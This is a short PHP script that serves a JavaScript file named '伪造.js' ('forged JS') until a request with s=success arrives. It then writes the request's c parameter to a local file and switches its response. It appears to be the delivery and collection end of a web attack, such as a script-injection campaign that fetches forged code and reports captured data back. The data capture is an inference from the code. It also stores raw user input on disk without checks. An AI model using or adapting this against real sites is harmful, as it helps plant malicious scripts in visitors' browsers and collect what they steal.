<?php
$status = 0;
$js = file_get_contents('伪造.js');
if ($_GET['s']=='success'){
	file_put_contents('1', $_GET['c']);
}
if (file_exists('1')){
	echo 1;
}
else{
header('Content-type: text/javascript');
echo $js;
}
?>